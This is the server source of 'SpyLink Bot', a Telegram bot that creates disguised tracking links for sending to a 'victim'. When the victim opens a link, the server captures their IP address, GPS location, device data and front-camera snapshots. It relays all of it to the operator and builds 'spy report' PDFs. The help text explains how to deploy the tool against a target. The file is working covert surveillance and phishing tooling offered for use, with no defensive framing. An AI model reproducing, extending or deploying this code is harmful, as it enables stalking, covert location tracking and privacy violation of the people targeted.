// server.js
require('dotenv').config();
const fs = require("fs");
const path = require("path");
const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const pdfMake = require('pdfmake');
const fonts = {
  Roboto: {
    normal: 'Helvetica',
    bold: 'Helvetica-Bold',
    italics: 'Helvetica-Oblique',
    bolditalics: 'Helvetica-BoldOblique'
  }
};
const printer = new pdfMake(fonts);
const { v4: uuidv4 } = require('uuid');

const app = express();
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });

// Security & Performance
app.use(require('helmet')());
app.use(require('compression')());
app.use(require('morgan')('combined'));

// Middlewares
app.use(cors({ origin: '*' }));
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.set("view engine", "ejs");
app.use(express.static("public"));

// Host URL
const hostURL = process.env.HOST_URL || "https://yourdomain.com";
const useShortener = false;

// In-memory storage (replace with DB in production)
let sessions = {};
let adminPanelAccess = {}; // { chatId: true }

// ==================== ROUTES ====================

app.get("/w/:path/:uri", (req, res) => {
  const ip = getIP(req);
  const time = getTime();
  if (req.params.path) {
    res.render("webview", { ip, time, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: useShortener });
  } else {
    res.redirect("https://t.me/aadi_io");
  }
});

app.get("/c/:path/:uri", (req, res) => {
  const ip = getIP(req);
  const time = getTime();
  if (req.params.path) {
    res.render("cloudflare", { ip, time, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: useShortener });
  } else {
    res.redirect("https://t.me/aadi_io");
  }
});

app.get("/", (req, res) => {
  res.json({ ip: getIP(req), status: "OK", version: "2.0" });
});

// ==================== TELEGRAM BOT ====================

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text?.trim();

  // Admin Panel Access
  if (text === "/admin" && chatId == process.env.ADMIN_ID) {
    adminPanelAccess[chatId] = true;
    return bot.sendMessage(chatId, "🔐 Admin Panel Activated. Use /panel", { parse_mode: "Markdown" });
  }

  if (msg?.reply_to_message?.text === "🌐 Enter Your URL") {
    return await createLink(chatId, text);
  }

  switch (text) {
    case "/start":
      return sendStartMessage(chatId, msg.chat.first_name);
    case "/create":
      return createNew(chatId);
    case "/help":
      return sendHelp(chatId);
    case "/panel":
      if (adminPanelAccess[chatId]) return showAdminPanel(chatId);
      break;
    case "/stats":
      if (adminPanelAccess[chatId]) return sendStats(chatId);
      break;
    default:
      if (!text) return;
      bot.sendMessage(chatId, "❓ Unknown command. Type /help");
  }
});

bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  await bot.answerCallbackQuery(callbackQuery.id);

  if (data === "crenew") {
    createNew(chatId);
  } else if (data === "genpdf") {
    const sessionId = callbackQuery.message.text.match(/ID:\s*(\S+)/)?.[1];
    if (sessionId && sessions[sessionId]) {
      await generateAndSendPDF(chatId, sessionId);
    } else {
      bot.sendMessage(chatId, "❌ Session not found.");
    }
  } else if (data === "export_all") {
    if (adminPanelAccess[chatId]) {
      exportAllData(chatId);
    }
  }
});

bot.on('polling_error', (error) => {
  console.error("Polling error:", error.code, error.message);
});

// ==================== DATA ENDPOINTS ====================

app.post("/location", async (req, res) => {
  const { lat, lon, uid, acc } = req.body;
  if (lat && lon && uid && acc) {
    const userId = parseInt(uid, 36);
    const sessionId = sessions[uid]?.id;
    if (sessionId) {
      sessions[sessionId].location = { lat, lon, accuracy: acc };
      await bot.sendLocation(userId, parseFloat(lat), parseFloat(lon));
      await bot.sendMessage(userId, `📍 Location Captured\nLat: ${lat}\nLon: ${lon}\nAccuracy: ${acc}m`, { reply_markup: { inline_keyboard: [[{ text: "📄 Generate Full Report (PDF)", callback_data: "genpdf" }]] } });
    }
    res.send("Done");
  } else {
    res.status(400).send("Invalid data");
  }
});

app.post("/camsnap", async (req, res) => {
  const { uid, img } = req.body;
  if (uid && img) {
    const buffer = Buffer.from(img, 'base64');
    const sessionId = sessions[uid]?.id;
    if (sessionId) {
      if (!sessions[sessionId].images) sessions[sessionId].images = [];
      sessions[sessionId].images.push(buffer.toString('base64'));
    }
    await bot.sendPhoto(parseInt(uid, 36), buffer, {}, { caption: "📸 Camera Snapshot Captured" });
    res.send("Done");
  } else {
    res.status(400).send("Invalid image data");
  }
});

app.post("/", async (req, res) => {
  const { uid, data } = req.body;
  const ip = getIP(req);
  if (uid && data) {
    const userId = parseInt(uid, 36);
    const sessionId = uuidv4();
    sessions[uid] = { id: sessionId, data: decodeURIComponent(data), ip, timestamp: new Date(), images: [] };

    // Send formatted message
    let cleanData = decodeURIComponent(data).replaceAll("<br>", "\n").replaceAll("<b>", "*").replaceAll("</b>", "*").replaceAll("<code>", "`").replaceAll("</code>", "`");
    await bot.sendMessage(userId, `📱 *Device Report Received*\nSession ID: \`${sessionId}\`\n\n${cleanData}`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📷 View Snapshots", callback_data: "view_snaps_" + sessionId }],
          [{ text: "📄 Generate PDF Report", callback_data: "genpdf" }]
        ]
      }
    });

    // Auto-generate PDF after 10 seconds if no interaction
    setTimeout(() => {
      if (sessions[sessionId]) {
        generateAndSendPDF(userId, sessionId);
      }
    }, 10000);

    res.send("Done");
  } else {
    res.send("ok");
  }
});

// ==================== UTILITY FUNCTIONS ====================

function getIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
         req.connection?.remoteAddress ||
         req.socket?.remoteAddress ||
         req.ip;
}

function getTime() {
  return new Date().toISOString().replace('T', ' ').substring(0, 19);
}

async function createLink(cid, url) {
  if (!url || !/^https?:\/\//i.test(url)) {
    return bot.sendMessage(cid, "⚠️ Invalid URL. Must start with http:// or https://");
  }

  try {
    const encodedUrl = btoa(encodeURIComponent(url));
    const path = cid.toString(36);
    const fullUrl = `${path}/${encodedUrl}`;
    let cUrl = `${hostURL}/c/${fullUrl}`;
    let wUrl = `${hostURL}/w/${fullUrl}`;

    if (useShortener) {
      const [x, y] = await Promise.all([
        shortenUrl(cUrl),
        shortenUrl(wUrl)
      ]);
      cUrl = x; wUrl = y;
    }

    const message = `
✅ *Tracking Links Generated*

🔗 *Original URL:* ${url}

🌐 *Cloudflare Page:*
${cUrl}

📱 *WebView Page:*
${wUrl}

⏱️ Data will auto-send when victim opens link.
📊 Full PDF report generated after data collection.

👇 *Options:*
`;
    await bot.sendMessage(cid, message, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🆕 Create New Link", callback_data: "crenew" }],
          [{ text: "📂 View All Sessions", callback_data: "view_sessions" }]
        ]
      }
    });
  } catch (e) {
    console.error(e);
    bot.sendMessage(cid, "❌ Error generating links. Try again.");
  }
}

async function shortenUrl(longUrl) {
  try {
    const res = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(longUrl)}`);
    const json = await res.json();
    return Object.values(json)[0] || longUrl;
  } catch {
    return longUrl;
  }
}

function createNew(cid) {
  bot.sendMessage(cid, "🌐 *Enter the target URL (must include http:// or https://)*", {
    parse_mode: "Markdown",
    reply_markup: { force_reply: true }
  });
}

async function generateAndSendPDF(chatId, sessionId) {
  const session = sessions[sessionId];
  if (!session) return bot.sendMessage(chatId, "❌ Session expired or not found.");

  const docDefinition = {
    content: [
      { text: '🕵️ SPYLINK DETAILED REPORT', style: 'header' },
      { text: `Session ID: ${sessionId}`, style: 'subheader' },
      { text: `Generated: ${new Date().toLocaleString()}`, style: 'subheader' },
      { text: '\n\n' },
      { text: '📡 VICTIM INFORMATION', style: 'section' },
      { text: session.data.replace(/<[^>]*>?/gm, '').replace(/&nbsp;/g, ' ') },
      { text: '\n\n' },
      ...(session.location ? [
        { text: '📍 LOCATION DATA', style: 'section' },
        `Latitude: ${session.location.lat}`,
        `Longitude: ${session.location.lon}`,
        `Accuracy: ${session.location.accuracy} meters`,
        { text: '\n\n' }
      ] : []),
      ...(session.images?.length > 0 ? [
        { text: '📸 CAMERA SNAPSHOTS', style: 'section' },
        ...session.images.map(img => ({ image: `data:image/png;base64,${img}`, width: 400 })),
        { text: '\n\n' }
      ] : [])
    ],
    styles: {
      header: { fontSize: 22, bold: true, margin: [0, 0, 0, 10] },
      subheader: { fontSize: 14, italic: true, margin: [0, 0, 0, 5] },
      section: { fontSize: 18, bold: true, margin: [0, 10, 0, 5] }
    }
  };

  const pdfDoc = printer.createPdfKitDocument(docDefinition);
  const chunks = [];
  pdfDoc.on('data', chunk => chunks.push(chunk));
  pdfDoc.on('end', async () => {
    const result = Buffer.concat(chunks);
    await bot.sendDocument(chatId, result, {}, { caption: "📄 Full Spy Report (PDF)", filename: `spy_report_${sessionId}.pdf` });
    delete sessions[sessionId]; // Cleanup
  });
  pdfDoc.end();
}

// ==================== ADMIN PANEL ====================

async function showAdminPanel(chatId) {
  const totalSessions = Object.keys(sessions).length;
  const activeUsers = new Set(Object.values(sessions).map(s => s.userId)).size;

  let msg = `
🔐 *ADMIN PANEL*

📊 Total Active Sessions: *${totalSessions}*
👥 Unique Targets: *${activeUsers}*
⏳ Server Uptime: *${process.uptime().toFixed(0)}s*

🛠️ *Actions:*
`;
  await bot.sendMessage(chatId, msg, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📈 View Stats", callback_data: "stats" }],
        [{ text: "💾 Export All Data", callback_data: "export_all" }],
        [{ text: "🧹 Clear Sessions", callback_data: "clear_sessions" }]
      ]
    }
  });
}

async function sendStats(chatId) {
  const stats = {
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    sessions: Object.keys(sessions).length,
    uniqueTargets: new Set(Object.values(sessions).map(s => s.userId)).size
  };
  let msg = `📊 *SERVER STATS*\n\n`;
  msg += `⏱️ Uptime: ${stats.uptime.toFixed(0)} seconds\n`;
  msg += `MemoryWarning: ${(stats.memory.heapUsed / 1024 / 1024).toFixed(2)} MB / ${(stats.memory.heapTotal / 1024 / 1024).toFixed(2)} MB\n`;
  msg += `📁 Active Sessions: ${stats.sessions}\n`;
  msg += `🎯 Unique Targets: ${stats.uniqueTargets}`;
  bot.sendMessage(chatId, msg, { parse_mode: "Markdown" });
}

function exportAllData(chatId) {
  const data = JSON.stringify(sessions, null, 2);
  const buffer = Buffer.from(data);
  bot.sendDocument(chatId, buffer, {}, { caption: "💾 Full Data Export (JSON)", filename: `export_${Date.now()}.json` });
}

// ==================== UI MESSAGES ====================

function sendStartMessage(chatId, firstName) {
  bot.sendMessage(chatId, `🎉 *Welcome ${firstName}!* 

I am *SpyLink Bot* — your ultimate digital reconnaissance tool.

✨ *Features:*
📍 Real-time GPS Location
📱 Full Device/Browser Fingerprint
🔋 Battery, Network, Sensors
📷 Front Camera Snapshots (up to 4)
🖨️ Auto-generated PDF Reports
🌐 Cloudflare or WebView Cloaking

👇 *Get Started:*
`, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🚀 Create Tracking Link", callback_data: "crenew" }],
        [{ text: "📘 Help & Instructions", callback_data: "help" }]
      ]
    }
  });
}

function sendHelp(chatId) {
  bot.sendMessage(chatId, `📘 *HOW TO USE*

1️⃣ Send /create
2️⃣ Enter any URL (e.g., https://google.com)
3️⃣ You’ll receive 2 cloaked tracking links:
   → Cloudflare-style (looks legit)
   → WebView (full-screen capture)

4️⃣ Send link to target.
5️⃣ When opened, you’ll instantly receive:
   → IP, Location, Device Info, Browser Data
   → 4 Camera snapshots (if permitted)
   → Auto-generated PDF report

⚠️ *Note:* Some sites block iframe embedding. Use WebView mode for best results.

👨‍💻 Admin: @aadi_io`, { parse_mode: "Markdown" });
}

// ==================== START SERVER ====================

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 SpyLink Bot v2.0 Running on Port ${PORT}`);
  console.log(`🔗 Host URL: ${hostURL}`);
  console.log(`🤖 Bot Active. Monitoring...`);
});
